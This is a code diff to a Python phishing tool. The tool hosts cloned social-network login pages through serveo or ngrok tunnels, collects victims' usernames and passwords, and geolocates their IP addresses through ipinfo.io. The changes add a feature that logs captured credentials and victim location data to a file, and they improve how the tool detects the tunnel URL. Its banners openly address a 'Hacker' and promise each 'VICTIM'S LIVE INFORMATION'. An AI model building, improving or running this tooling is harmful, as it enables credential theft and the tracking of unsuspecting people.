@@ -5,7 +5,7 @@
 #
 ###########################
 from time import sleep
-from sys import stdout, exit
+from sys import stdout, exit, argv
 from os import system, path
 from distutils.dir_util import copy_tree
 import multiprocessing
@@ -17,7 +17,7 @@ import json
 from subprocess import check_output
 
 
-RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
+RED, WHITE, CYAN, GREEN, END = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m', '\033[0m'
 
 def connected(host='http://duckduckgo.com'):
     try:
@@ -126,15 +126,25 @@ def runPhishing(social, option2):
         copy_tree("WebPages/VK_poll_method/", "Server/www/")
 
 
+didBackground = True
+logFile = None
+for arg in argv:
+    if arg=="--nolog":
+        didBackground = False
+if didBackground:
+    logFile = open("log.txt", "w")
 
 
-
+def log(ctx):
+    if didBackground:
+        logFile.write(ctx.replace(RED, "").replace(WHITE, "").replace(CYAN, "").replace(GREEN, "").replace(END, "") + "\n")
+    print(ctx)
 
 
 def waitCreds():
-    print ("{0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END))
+    print("{0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END))
 
-    print ('''{0}
+    print('''{0}
    _.-=-._     .-,
  .'       "-.,' /
 (  AnonUD4Y_  ~.<
@@ -143,17 +153,16 @@ def waitCreds():
  [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION .
  [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, CITY, COUNTRY, AND MANY MORE STUFF.{0}'''.format(CYAN, END))
 
-    print (" {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END))
+    print(" {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END))
     while True:
-
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                print ('======================================================================'.format(RED, END))
-                print (' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
+                log('======================================================================'.format(RED, END))
+                log(' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
                 system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
-                print ('======================================================================'.format(RED, END))
-                print (' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END))
+                log('======================================================================'.format(RED, END))
+                log(' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, END))
 
         creds.close()
 
@@ -165,19 +174,19 @@ def waitCreds():
                 resp = urlopen('https://ipinfo.io/%s/json' % ip)
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
-                    print ('======================================================================'.format(RED, END))
-                    print (' \n{0}[ VICTIM IP BOGUS ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
+                    log('======================================================================'.format(RED, END))
+                    log(' \n{0}[ VICTIM IP BOGUS ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
                 else:
                     matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                     latitude = matchObj.group(1)
                     longitude = matchObj.group(2)
-                    print ('======================================================================'.format(RED, END))
-                    print (' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
-                    print (' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, END) % (longitude, latitude))
-                    print (' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country']))
-                    print (' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city']))
+                    log('======================================================================'.format(RED, END))
+                    log(' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
+                    log(' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, END) % (longitude, latitude))
+                    log(' \n{0}ISP: %s \nCountry: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country']))
+                    log(' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city']))
                 system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
-                print ('======================================================================'.format(RED, END))
+                log('======================================================================'.format(RED, END))
 
         creds.close()
 
@@ -287,17 +296,17 @@ def serveo():
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > sendlink.txt 2> /dev/null & ')
     sleep(7)
     f = open('sendlink.txt', 'r')
-    a = ['[32m', 'Forwarding', 'HTTP', 'traffic', 'from', '[0m', ' ']
+    a = ['\033[32m', 'Forwarding', 'HTTP', 'traffic', 'from', '\033[0m', ' ']
     lst = []
     for line in f:
-    	for word in a:
+        for word in a:
             if word in line:
-            	line = line.replace(word,'')	    	
-    	lst.append(line)
+                line = line.replace(word,'')            
+        lst.append(line)
     f.close()
     f = open('sendlink.txt','w')
     for line in lst:
-    	f.write(line)
+        f.write(line)
     f.close()
     url = open('sendlink.txt', 'r')    
     print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(CYAN, END, GREEN) + url.read() + "{1}".format(CYAN, END, GREEN))
@@ -306,11 +315,15 @@ def serveo():
 
 def runNgrok():
     system('./Server/ngrok http 1111 > /dev/null &')
-    sleep(10)
-    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
-    url = open('ngrok.url', 'r')
-    print("\n {0}[{1}*{0}]{1} Ngrok URL: {2}".format(CYAN, END, GREEN) + url.read() + "{1}".format(CYAN, END, GREEN))
-    url.close()
+    while True:
+        sleep(2)
+        system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
+        urlFile = open('ngrok.url', 'r')
+        url = urlFile.read()
+        urlFile.close()
+        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
+            print("\n {0}[{1}*{0}]{1} Ngrok URL: {2}".format(CYAN, END, GREEN) + url + "{1}".format(CYAN, END, GREEN))
+            break
     
     
 def runServer():
@@ -345,7 +358,9 @@ if __name__ == "__main__":
 
            
 
-    except KeyboardInterrupt:        
+    except KeyboardInterrupt: 
+        if didBackground:
+            logFile.close()
         system('pkill -f ssh')
         system('pkill -f php')
         system('pkill -f ngrok')
